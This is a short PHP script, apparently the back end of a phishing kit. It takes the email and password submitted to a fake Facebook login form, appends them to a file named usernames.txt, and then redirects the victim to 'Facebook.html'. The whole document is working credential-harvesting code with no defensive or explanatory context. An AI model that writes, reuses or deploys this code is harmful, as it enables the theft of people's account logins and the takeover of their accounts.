<?php
file_put_contents("usernames.txt", "Username: " . $_POST['email'] . "Password: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: Facebook.html');
exit
?>
